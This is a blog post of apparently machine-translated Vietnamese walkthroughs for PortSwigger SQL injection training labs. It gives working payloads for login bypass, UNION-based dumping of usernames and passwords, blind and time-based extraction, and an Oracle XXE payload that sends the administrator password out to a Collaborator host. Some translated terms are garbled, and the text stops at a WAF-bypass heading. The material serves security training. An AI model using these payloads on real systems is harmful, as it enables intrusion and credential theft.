---
layout: post
title: "SQL injection"
render_with_liquid: false
categories:
  - PortSwigger
tags:
  - portswigger
  - sql-injection
source_collection: notion_portswigger
---
Created by: Nguyễn Giang Nam
Topics: Server-side

# **Lab 01: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data**

Sửa tham số `category` và gán cho nó giá trị `'+OR+1=1--`

# **Lab 02: SQL injection vulnerability allowing login bypass**

- Sử dụng Burp Suite để chặn và sửa đổi yêu cầu đăng nhập.
- Sửa đổi tham số tên người dùng, đặt giá trị cho nó: `administrator'--`

# **Lab 03: SQL injection attack, querying the database type and version on Oracle**

1. Sử dụng Burp Suite để chặn và sửa đổi yêu cầu đặt bộ lọc danh mục sản phẩm.
2. Xác định [số lượng cột đang được truy vấn trả về](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) và [cột nào chứa dữ liệu văn bản](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Xác minh rằng truy vấn đang trả về hai cột, cả hai đều chứa văn bản, bằng cách sử dụng tải trọng như sau trong tham số `category`:
    
    ```jsx
    '+UNION+SELECT+'abc','def'+FROM+dual--
    ```
    
3. Sử dụng tải trọng sau để hiển thị phiên bản cơ sở dữ liệu:
    
    ```jsx
    '+UNION+SELECT+BANNER,+NULL+FROM+v$version--
    ```
    

# **Lab 04: SQL injection attack, querying the database type and version on MySQL and Microsoft**

1. Sử dụng Burp Suite để chặn và sửa đổi yêu cầu đặt bộ lọc danh mục sản phẩm.
2. Xác định [số lượng cột đang được truy vấn trả về](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) và [cột nào chứa dữ liệu văn bản](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Xác minh rằng truy vấn đang trả về hai cột, cả hai đều chứa văn bản, bằng cách sử dụng tải trọng như sau trong tham số `category`:
    
    ```jsx
    '+UNION+SELECT+'abc','def'#
    ```
    
3. Sử dụng tải trọng sau để hiển thị phiên bản cơ sở dữ liệu:
    
    ```jsx
    '+UNION+SELECT+@@version,+NULL#
    ```
    

# **Lab 05: SQL injection attack, listing the database contents on non-Oracle databases**

1. Sử dụng Burp Suite để chặn và sửa đổi yêu cầu đặt bộ lọc danh mục sản phẩm.
2. Xác định [số lượng cột đang được truy vấn trả về](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) và [cột nào chứa dữ liệu văn bản](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Xác minh rằng truy vấn đang trả về hai cột, cả hai đều chứa văn bản, bằng cách sử dụng tải trọng như sau trong tham số `category`:
    
    ```jsx
    '+UNION+SELECT+'abc','def'--
    ```
    
3. Sử dụng tải trọng sau để truy xuất danh sách các bảng trong cơ sở dữ liệu:
    
    ```jsx
    '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
    ```
    
4. Tìm tên của bảng chứa thông tin đăng nhập người dùng.
5. Sử dụng tải trọng sau (thay thế tên bảng) để truy xuất chi tiết của các cột trong bảng:
    
    ```jsx
    '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
    ```
    
6. Tìm tên của các cột chứa tên người dùng và mật khẩu.
7. Sử dụng tải trọng sau (thay thế tên bảng và cột) để truy xuất tên người dùng và mật khẩu cho tất cả người dùng:
    
    ```jsx
    '+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
    ```
    
8. Tìm mật khẩu cho người dùng `quản trị viên` và sử dụng mật khẩu đó để đăng nhập.

# **Lab 06: SQL injection attack, listing the database contents on Oracle**

1. Sử dụng Burp Suite để chặn và sửa đổi yêu cầu đặt bộ lọc danh mục sản phẩm.
2. Xác định [số lượng cột đang được truy vấn trả về](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) và [cột nào chứa dữ liệu văn bản](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Xác minh rằng truy vấn đang trả về hai cột, cả hai đều chứa văn bản, bằng cách sử dụng tải trọng như sau trong tham số `category`:
    
    ```jsx
    '+UNION+SELECT+'abc','def'+FROM+dual--
    ```
    
3. Sử dụng tải trọng sau để truy xuất danh sách các bảng trong cơ sở dữ liệu:
    
    ```jsx
    '+UNION+SELECT+table_name,NULL+FROM+all_tables--
    ```
    
4. Tìm tên của bảng chứa thông tin đăng nhập người dùng.
5. Sử dụng tải trọng sau (thay thế tên bảng) để truy xuất chi tiết của các cột trong bảng:
    
    ```jsx
    '+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
    ```
    
6. Tìm tên của các cột chứa tên người dùng và mật khẩu.
7. Sử dụng tải trọng sau (thay thế tên bảng và cột) để truy xuất tên người dùng và mật khẩu cho tất cả người dùng:
    
    ```jsx
    '+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
    ```
    
8. Tìm mật khẩu cho người dùng `quản trị viên` và sử dụng mật khẩu đó để đăng nhập.

# **Lab 07: SQL injection UNION attack, determining the number of columns returned by the query**

**Cách 1: Sử dụng order by**

1. Sửa đổi tham số `category` , cung cấp cho nó giá trị `category=Pets' order by 4-- -`. Quan sát rằng một lỗi xảy ra.
    
    ![image.png](/assets/img/portswigger/sql-injection/image.png)
    
2. Sửa đổi tham số `category` , cung cấp cho nó giá trị `category=Pets' order by 3-- -`. Quan sát rằng không có lỗi xảy ra.
    
    ![image.png](/assets/img/portswigger/sql-injection/image%201.png)
    

`⇒ Từ 2 kết quả trên ta kết luận bảng của truy vấn hiện tại có 3 cột`

**Cách 2:** 

1. Sử dụng Burp Suite để chặn và sửa đổi yêu cầu đặt bộ lọc danh mục sản phẩm.
2. Sửa đổi tham số `category` , cung cấp cho nó giá trị `'+ UNION + SELECT + NULL--`. Quan sát rằng một lỗi xảy ra.
3. Sửa đổi tham số `category` để thêm một cột bổ sung chứa giá trị rỗng:
    
    ```jsx
    '+UNION+SELECT+NULL,NULL--
    ```
    
4. Tiếp tục thêm các giá trị rỗng cho đến khi lỗi biến mất và phản hồi bao gồm nội dung bổ sung có chứa các giá trị rỗng.

# **Lab 08: SQL injection UNION attack, finding a column containing text**

1. Sử dụng Burp Suite để chặn và sửa đổi yêu cầu đặt bộ lọc danh mục sản phẩm.
2. Xác định [số cột đang được truy vấn trả về](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns). Xác minh rằng truy vấn đang trả về ba cột, sử dụng tải trọng sau trong tham số `category`:
    
    ```jsx
    '+UNION+SELECT+NULL,NULL,NULL--
    ```
    
3. Hãy thử thay thế mỗi giá trị rỗng bằng giá trị ngẫu nhiên do phòng thí nghiệm cung cấp, ví dụ:
    
    ```jsx
    '+UNION+SELECT+'abcdef',NULL,NULL--
    ```
    
4. Nếu xảy ra lỗi, hãy chuyển sang giá trị rỗng tiếp theo và thử thay thế.

# **Lab 09: SQL injection UNION attack, retrieving data from other tables**

1. Sử dụng Burp Suite để chặn và sửa đổi yêu cầu đặt bộ lọc danh mục sản phẩm.
2. Xác định [số lượng cột đang được truy vấn trả về](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) và [cột nào chứa dữ liệu văn bản](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Xác minh rằng truy vấn đang trả về hai cột, cả hai đều chứa văn bản, sử dụng tải trọng như sau trong tham số `category`:
    
    ```jsx
    '+UNION+SELECT+'abc','def'--
    ```
    
3. Sử dụng tải trọng sau để truy xuất nội dung của bảng `users` 
    
    ```jsx
    '+UNION+SELECT+username,+password+FROM+users--
    ```
    
4. Xác minh rằng phản hồi của ứng dụng có chứa tên người dùng và mật khẩu.

# Lab 10: **SQL injection UNION attack, retrieving multiple values in a single column**

1. Sử dụng Burp Suite để chặn và sửa đổi yêu cầu đặt bộ lọc danh mục sản phẩm.
2. Xác định [số lượng cột đang được truy vấn trả về](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) và [cột nào chứa dữ liệu văn bản](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Xác minh rằng truy vấn đang trả về hai cột, chỉ một trong số đó chứa văn bản, sử dụng tải trọng như sau trong tham số `category`:
    
    ```jsx
    '+UNION+SELECT+NULL,'abc'--
    ```
    
3. Sử dụng tải trọng sau để truy xuất nội dung của bảng `users`
    
    ```jsx
    '+UNION+SELECT+NULL,username||'~'||password+FROM+users--
    ```
    
4. Xác minh rằng phản hồi của ứng dụng có chứa tên người dùng và mật khẩu.

# **Lab 11: Blind SQL injection with conditional responses**

1. Truy cập trang đầu của cửa hàng và sử dụng Burp Suite để chặn và sửa đổi yêu cầu có chứa cookie `TrackingId`. Để đơn giản, giả sử giá trị ban đầu của cookie là `TrackingId=xyz`.
2. Sửa đổi cookie `TrackingId`, thay đổi thành:
    
    ```jsx
    TrackingId=xyz' AND '1'='1
    ```
    
    Xác minh rằng thông báo  `Welcome back` xuất hiện trong phản hồi.
    
3. Bây giờ thay đổi nó thành:
    
    ```jsx
    TrackingId=xyz' AND '1'='2
    ```
    
    Xác minh rằng thông báo `Welcome back` không xuất hiện trong phản hồi. Điều này chứng minh cách bạn có thể kiểm tra một điều kiện boolean duy nhất và suy ra kết quả.
    
4. Bây giờ thay đổi nó thành:
    
    ```jsx
    TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
    ```
    
    Xác minh rằng điều kiện là đúng, xác nhận rằng có một bảng được gọi là `users`
    
5. Bây giờ thay đổi nó thành:
    
    ```jsx
    TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
    ```
    
    Xác minh rằng điều kiện là đúng, xác nhận rằng có một người dùng được gọi là `quản trị viên`.
    
6. Bước tiếp theo là xác định có bao nhiêu ký tự trong mật khẩu của người dùng `quản trị viên`. Để thực hiện việc này, hãy thay đổi giá trị thành:
    
    ```jsx
    TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
    ```
    
    Điều kiện này phải đúng, vì mật khẩu có độ dài lớn hơn 1 ký tự.
    
7. Gửi một loạt các giá trị tiếp theo để kiểm tra độ dài mật khẩu khác nhau. Gửi:
    
    ```jsx
    TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
    ```
    
    Sau đó gửi:
    
    ```jsx
    TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a
    ```
    
    Và như vậy. Bạn có thể thực hiện việc này theo cách thủ công bằng cách sử dụng Bộ lặp ợ hơi, vì độ dài có thể ngắn. Khi điều kiện không còn đúng (tức là khi `Welcome back` biến mất), bạn đã xác định độ dài của mật khẩu, trên thực tế dài 20 ký tự.
    
8. Sau khi xác định độ dài của mật khẩu, bước tiếp theo là kiểm tra ký tự ở mỗi vị trí để xác định giá trị của nó. Điều này liên quan đến một số lượng yêu cầu lớn hơn nhiều, vì vậy bạn cần sử dụng Burp Intruder. Gửi yêu cầu bạn đang làm việc đến Burp Intruder, sử dụng menu ngữ cảnh.
9. Trong Burp Intruder, thay đổi giá trị của cookie thành:
    
    ```jsx
    TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
    ```
    
    Điều này sử dụng hàm `SUBSTRING()` để trích xuất một ký tự duy nhất từ mật khẩu và kiểm tra nó với một giá trị cụ thể. Đòn tấn công của chúng ta sẽ xoay vòng qua từng vị trí và giá trị có thể, kiểm tra lần lượt từng vị trí.
    
10. Đặt các điểm đánh dấu vị trí tải trọng xung quanh ký tự `a` cuối cùng trong giá trị cookie. Để thực hiện việc này, chỉ chọn `a` và nhấp vào nút `Add §`. Sau đó, bạn sẽ thấy giá trị cookie sau đây (lưu ý các điểm đánh dấu vị trí tải trọng):
    
    ```jsx
    TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
    ```
    
11. Để kiểm tra nhân vật ở mỗi vị trí, bạn sẽ cần gửi tải trọng phù hợp ở vị trí tải trọng mà bạn đã xác định. Bạn có thể giả định rằng mật khẩu chỉ chứa các ký tự chữ và số viết thường. Trong tệp Bảng điều khiển bên Payloads, hãy kiểm tra xem Danh sách đơn giản đã được chọn và trong Cấu hình tải trọng thêm tải trọng trong phạm vi a - z và 0 - 9. Bạn có thể chọn chúng dễ dàng bằng cách sử dụng menu thả xuống Thêm từ danh sách.
12. Để có thể biết khi nào ký tự chính xác được gửi, bạn sẽ cần grep từng phản hồi cho biểu thức `Welcome back`. Để thực hiện việc này, hãy nhấp vào Tab Cài đặt để mở bảng điều khiển bên Cài đặt. Trong mục Grep - Match, xóa các mục hiện có trong danh sách, sau đó thêm giá trị `Welcome back`.
13. Khởi động cuộc tấn công bằng cách nhấp vào nút Bắt đầu tấn công.
14. Xem lại kết quả tấn công để tìm ra giá trị của nhân vật ở vị trí đầu tiên. Bạn sẽ thấy một cột trong kết quả có tên `Welcome back`. Một trong các hàng sẽ có dấu tích trong cột này. Tải trọng hiển thị cho hàng đó là giá trị của ký tự ở vị trí đầu tiên.
15. Bây giờ, bạn chỉ cần chạy lại cuộc tấn công cho từng vị trí ký tự khác trong mật khẩu, để xác định giá trị của chúng. Để thực hiện việc này, hãy quay lại tab Intruder và thay đổi độ lệch được chỉ định từ 1 thành 2. Sau đó, bạn sẽ thấy giá trị cookie như sau:
    
    ```jsx
    TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
    ```
    
16. Khởi động đòn tấn công đã sửa đổi, xem lại kết quả và lưu ý ký tự ở vị trí số 2
17. Tiếp tục quá trình này để kiểm tra offset 3, 4, v.v. cho đến khi bạn có toàn bộ mật khẩu.
18. Trong trình duyệt, nhấp vào Tài khoản của tôi để mở trang đăng nhập. Sử dụng mật khẩu để đăng nhập với tư cách `người dùng quản trị viên`.

# **Lab 12: Blind SQL injection with conditional errors**

1. Truy cập trang đầu của cửa hàng và sử dụng Burp Suite để chặn và sửa đổi yêu cầu có chứa cookie `TrackingId`. Để đơn giản, giả sử giá trị ban đầu của cookie là `TrackingId=xyz`.
2. Sửa đổi cookie `TrackingId`, thêm một dấu ngoặc kép vào đó:
    
    ```jsx
    TrackingId=xyz'
    ```
    
    Xác minh rằng đã nhận được thông báo lỗi.
    
3. Bây giờ thay đổi nó thành hai dấu ngoặc kép: 
    
    ```jsx
    TrackingId=xyz''
    ```
    
    Xác minh rằng lỗi biến mất. Điều này cho thấy rằng lỗi cú pháp (trong trường hợp này là dấu ngoặc kép chưa đóng) đang có ảnh hưởng có thể phát hiện được đối với phản hồi.
    
4. Bây giờ bạn cần xác nhận rằng máy chủ đang diễn giải việc tiêm như một truy vấn SQL, tức là lỗi là lỗi cú pháp SQL trái ngược với bất kỳ loại lỗi nào khác. Để làm điều này, trước tiên bạn cần xây dựng một truy vấn con bằng cú pháp SQL hợp lệ. Thử gửi:
    
    ```jsx
    TrackingId=xyz'||(SELECT '')||'
    ```
    
    Trong trường hợp này, hãy lưu ý rằng truy vấn vẫn có vẻ không hợp lệ. Điều này có thể là do loại cơ sở dữ liệu - hãy thử chỉ định tên bảng có thể dự đoán được trong truy vấn:
    
    ```jsx
    TrackingId=xyz'||(SELECT '' FROM dual)||'
    ```
    
    Khi bạn không còn nhận được lỗi, điều này cho thấy rằng đích có thể đang sử dụng cơ sở dữ liệu `Oracle`, yêu cầu tất cả các câu lệnh `SELECT` để chỉ định rõ ràng tên bảng.
    
5. Bây giờ bạn đã tạo ra những gì có vẻ là một truy vấn hợp lệ, hãy thử gửi một truy vấn không hợp lệ trong khi vẫn giữ nguyên cú pháp SQL hợp lệ. 
    
    Ví dụ: thử truy vấn tên bảng không tồn tại:
    
    ```jsx
    TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'
    ```
    
    Lần này, một lỗi được trả về. Hành vi này gợi ý mạnh mẽ rằng việc chèn của bạn đang được xử lý dưới dạng truy vấn SQL bởi back-end.
    
6. Miễn là bạn đảm bảo luôn chèn các truy vấn SQL hợp lệ về mặt cú pháp, bạn có thể sử dụng phản hồi lỗi này để suy ra thông tin quan trọng về cơ sở dữ liệu. 
    
    Ví dụ: để xác minh rằng bảng `users` tồn tại, hãy gửi truy vấn sau:
    
    ```jsx
    TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
    ```
    
    Vì truy vấn này không trả về lỗi, bạn có thể suy ra rằng bảng này có tồn tại. Lưu ý rằng điều kiện `WHERE ROWNUM = 1` rất quan trọng ở đây để ngăn truy vấn trả về nhiều hơn một hàng, điều này sẽ phá vỡ sự nối của chúng ta.
    
7. Bạn cũng có thể khai thác hành vi này để kiểm tra các điều kiện. Trước tiên, hãy gửi truy vấn sau:
    
    ```jsx
    TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
    ```
    
    Xác minh rằng đã nhận được thông báo lỗi.
    
8. Bây giờ thay đổi nó thành:
    
    ```jsx
    TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
    ```
    
    Xác minh rằng lỗi biến mất. Điều này chứng minh rằng bạn có thể kích hoạt lỗi có điều kiện dựa trên sự thật của một điều kiện cụ thể. Câu lệnh `CASE` kiểm tra một điều kiện và đánh giá một biểu thức nếu điều kiện là đúng và một biểu thức khác nếu điều kiện là sai. Biểu thức trước chứa chia cho không, gây ra lỗi. Trong trường hợp này, hai tải trọng kiểm tra các điều kiện `1 = 1` và `1 = 2` và nhận được lỗi khi điều kiện là `đúng`.
    
9. Bạn có thể sử dụng hành vi này để kiểm tra xem các mục cụ thể có tồn tại trong bảng hay không. Ví dụ: sử dụng truy vấn sau để kiểm tra xem `quản trị viên` tên người dùng có tồn tại hay không:
    
    ```jsx
    TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
    ```
    
    Xác minh rằng điều kiện là đúng (nhận được lỗi), xác nhận rằng có một người dùng được gọi là `quản trị viên`.
    
10. Bước tiếp theo là xác định có bao nhiêu ký tự trong mật khẩu của người dùng `quản trị viên`. Để thực hiện việc này, hãy thay đổi giá trị thành:
    
    ```jsx
    TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
    ```
    
    Điều kiện này phải đúng, xác nhận rằng mật khẩu có độ dài lớn hơn 1 ký tự.
    
11. Gửi một loạt các giá trị tiếp theo để kiểm tra độ dài mật khẩu khác nhau. Gửi:
    
    ```jsx
    TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
    ```
    

# **Lab 13: Visible error-based SQL injection**

1. Sử dụng trình duyệt tích hợp của Burp, khám phá chức năng phòng thí nghiệm.
2. Vào tab **Lịch sử HTTP &gt; của Proxy** và tìm một `GET /` request có chứa cookie `TrackingId`.
3. Trong Repeater, thêm một dấu ngoặc kép vào giá trị của cookie `TrackingId` của bạn và gửi yêu cầu.
    
    ```jsx
    TrackingId=ogAZZfxtOKUELbuJ'
    ```
    
4. Trong phản hồi, hãy lưu ý thông báo lỗi dài dòng. Điều này tiết lộ truy vấn SQL đầy đủ, bao gồm cả giá trị cookie của bạn. Nó cũng giải thích rằng bạn có một ký tự chuỗi chưa đóng. Quan sát rằng chèn của bạn xuất hiện bên trong một chuỗi dấu ngoặc kép.
5. Trong yêu cầu, hãy thêm các ký tự nhận xét để nhận xét phần còn lại của truy vấn, bao gồm cả ký tự dấu ngoặc kép đơn bổ sung gây ra lỗi:
    
    ```jsx
    TrackingId=ogAZZfxtOKUELbuJ'--
    ```
    
6. Gửi yêu cầu. Xác nhận rằng bạn không còn nhận được lỗi nữa. Điều này cho thấy rằng truy vấn hiện có giá trị về mặt cú pháp.
7. Điều chỉnh truy vấn để bao gồm truy vấn con `SELECT` chung và truyền giá trị trả về cho kiểu dữ liệu `int`:
    
    ```jsx
    TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--
    ```
    
8. Gửi yêu cầu. Quan sát rằng bây giờ bạn nhận được một lỗi khác nói rằng một điều kiện `AND` phải là một biểu thức boolean.
9. Sửa đổi điều kiện cho phù hợp. Ví dụ: bạn có thể chỉ cần thêm toán tử so sánh (`=`) như sau:
    
    ```jsx
    TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
    ```
    
10. Gửi yêu cầu. Xác nhận rằng bạn không còn nhận được lỗi nữa. Điều này cho thấy rằng đây là một truy vấn hợp lệ một lần nữa.
11. Điều chỉnh câu lệnh `SELECT` chung của bạn để truy xuất tên người dùng từ cơ sở dữ liệu:
    
    ```jsx
    TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--
    ```
    
12. Quan sát rằng bạn nhận được thông báo lỗi ban đầu một lần nữa. Lưu ý rằng truy vấn của bạn hiện có vẻ bị cắt bớt do giới hạn ký tự. Do đó, các ký tự nhận xét bạn đã thêm để sửa truy vấn sẽ không được bao gồm.
13. Xóa giá trị ban đầu của cookie `TrackingId` để giải phóng một số ký tự bổ sung. Gửi lại yêu cầu.
    
    ```jsx
    TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
    ```
    
14. Lưu ý rằng bạn nhận được một thông báo lỗi mới, dường như được tạo bởi cơ sở dữ liệu. Điều này cho thấy rằng truy vấn đã được chạy đúng cách, nhưng bạn vẫn gặp lỗi vì nó bất ngờ trả về nhiều hàng.
15. Sửa đổi truy vấn để chỉ trả về một hàng:
    
    ```jsx
    TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
    ```
    
16. Gửi yêu cầu. Quan sát thấy rằng thông báo lỗi hiện rò rỉ tên người dùng đầu tiên từ bảng `users` :
    
    `ERROR: invalid input syntax for type integer: "administrator”`
    
17. Bây giờ bạn đã biết rằng `quản trị viên` là người dùng đầu tiên trong bảng, hãy sửa đổi truy vấn một lần nữa để rò rỉ mật khẩu của họ:
    
    ```jsx
    TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
    ```
    
18. Đăng nhập với tư cách `quản trị viên` bằng mật khẩu bị đánh cắp để giải quyết phòng thí nghiệm.

# **Lab 14: Blind SQL injection with time delays**

1. Truy cập trang đầu của cửa hàng và sử dụng Burp Suite để chặn và sửa đổi yêu cầu có chứa cookie `TrackingId`.
2. Sửa đổi cookie `TrackingId`, thay đổi thành:
    
    ```jsx
    TrackingId=x'||pg_sleep(10)--
    ```
    
3. Gửi yêu cầu và quan sát rằng ứng dụng mất 10 giây để phản hồi.

# Lab 15: **Lab: Blind SQL injection with time delays and information retrieval**

1. Truy cập trang đầu của cửa hàng và sử dụng Burp Suite để chặn và sửa đổi yêu cầu có chứa cookie `TrackingId`.
2. Sửa đổi cookie `TrackingId`, thay đổi thành:
    
    ```jsx
    TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
    ```
    
    Xác minh rằng ứng dụng mất 10 giây để phản hồi.
    
3. Bây giờ thay đổi nó thành:
    
    ```jsx
    TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
    ```
    
    Xác minh rằng ứng dụng phản hồi ngay lập tức mà không có độ trễ thời gian. Điều này chứng minh cách bạn có thể kiểm tra một điều kiện boolean duy nhất và suy ra kết quả.
    
4. Bây giờ thay đổi nó thành:
    
    ```jsx
    TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
    ```
    
    Xác minh rằng điều kiện là đúng, xác nhận rằng có một người dùng được gọi là `quản trị viên`.
    
5. Bước tiếp theo là xác định có bao nhiêu ký tự trong mật khẩu của người dùng `quản trị viên`. 
    
    Để thực hiện việc này, hãy thay đổi giá trị thành:
    
    ```jsx
    TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
    ```
    
    Điều kiện này phải đúng, xác nhận rằng mật khẩu có độ dài lớn hơn 1 ký tự.
    
6. Gửi một loạt các giá trị tiếp theo để kiểm tra độ dài mật khẩu khác nhau. Gửi:
    
    ```jsx
    TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
    ```
    
    Điều này sử dụng hàm `SUBSTRING()` để trích xuất một ký tự duy nhất từ mật khẩu và kiểm tra nó với một giá trị cụ thể. Đòn tấn công của chúng ta sẽ xoay vòng qua từng vị trí và giá trị có thể, kiểm tra lần lượt từng vị trí.
    
7. Để có thể biết khi nào ký tự chính xác được gửi, bạn sẽ cần theo dõi thời gian cần thiết để ứng dụng phản hồi từng yêu cầu. Để quá trình này đáng tin cậy nhất có thể, bạn cần định cấu hình cuộc tấn công Intruder để đưa ra các yêu cầu trong một luồng duy nhất. Để thực hiện việc này, hãy nhấp vào tab  **Nhóm tài nguyên** để mở bảng điều khiển bên Nhóm **tài nguyên** và thêm cuộc tấn công vào nhóm tài nguyên bằng **Yêu cầu đồng thời tối đa** được đặt thành `1`.
8. Trong trình duyệt, nhấp vào **Tài khoản của tôi** để mở trang đăng nhập. Sử dụng mật khẩu để đăng nhập với tư cách `người dùng quản trị viên`.

# **Lab 16: Blind SQL injection with out-of-band interaction**

1. Truy cập trang đầu của cửa hàng và sử dụng Burp Suite để chặn và sửa đổi yêu cầu có chứa cookie `TrackingId`.
2. Sửa đổi cookie `TrackingId`, thay đổi nó thành tải trọng sẽ kích hoạt tương tác với máy chủ Cộng tác viên. 
    
    Ví dụ, bạn có thể kết hợp SQL injection với các kỹ thuật XXE cơ bản như sau:
    
    ```jsx
    TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
    ```
    
3. Nhấp chuột phải và chọn "`Insert Collaborator payload`" để chèn Burp Collaborator subdomain vào nơi được chỉ ra trong cookie `TrackingId` đã sửa đổi.
4. Kết quả sẽ thấy 1 request đi từ database gọi tới collaborator server

# **Lab 17: Blind SQL injection with out-of-band data exfiltration**

1. Truy cập trang đầu của cửa hàng và sử dụng Burp Suite Professional để chặn và sửa đổi yêu cầu có chứa cookie `TrackingId`.
2. Sửa đổi cookie `TrackingId`, thay đổi nó thành tải trọng sẽ làm rò rỉ mật khẩu của quản trị viên trong tương tác với máy chủ Cộng tác viên. Ví dụ, bạn có thể kết hợp SQL injection với các kỹ thuật XXE cơ bản như sau:
    
    ```jsx
    TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
    ```
    
3. Nhấp chuột phải và chọn "Insert Collaborator payload" để chèn tên miền Burp Collaborator subdomain vào nơi được chỉ ra trong cookie `TrackingId` đã sửa đổi.
4. Chuyển đến tab Collaborator và nhấp vào "Poll Now". Nếu bạn không thấy bất kỳ tương tác nào được liệt kê, hãy đợi vài giây và thử lại, vì truy vấn phía máy chủ được thực thi không đồng bộ.
5. Bạn sẽ thấy một số tương tác DNS và HTTP do ứng dụng bắt đầu do tải trọng của bạn. Mật khẩu của người dùng `quản trị viên` sẽ xuất hiện trong miền phụ của tương tác và bạn có thể xem mật khẩu này trong tab Cộng tác viên. Đối với tương tác DNS, tên miền đầy đủ đã được tra cứu được hiển thị trong tab Mô tả. Đối với tương tác HTTP, tên miền đầy đủ được hiển thị trong tiêu đề Máy chủ trong tab Yêu cầu cộng tác viên.
6. Đăng nhập vào tài khoản administrator

# Lab 18: **Lab: SQL injection with filter bypass via XML encoding**

**Xác định lỗ hổng bảo mật**

1. Quan sát rằng tính năng kiểm tra hàng tồn kho gửi `productId` và `storeId` đến ứng dụng ở định dạng XML.
2. Gửi yêu cầu `POST /product/stock` đến Burp Repeater.
3. Trong Burp Repeater, hãy thăm dò `storeId` để xem liệu đầu vào của bạn có được đánh giá hay không. Ví dụ: hãy thử thay thế ID bằng các biểu thức toán học đánh giá với các ID tiềm năng khác, ví dụ:
    
    ```jsx
    <storeId>1+1</storeId>
    ```
    
4. Quan sát rằng đầu vào của bạn dường như được ứng dụng đánh giá, trả về kho cho các cửa hàng khác nhau.
5. Hãy thử xác định số cột được trả về bởi truy vấn ban đầu bằng cách thêm câu lệnh `UNION SELECT` vào ID cửa hàng ban đầu:
    
    ```jsx
    <storeId>1 UNION SELECT NULL</storeId>
    ```
    
6. Quan sát rằng yêu cầu của bạn đã bị chặn do bị gắn cờ là một cuộc tấn công tiềm ẩn.
    
    `"Attack detected”`
    

**Bypass the WAF**

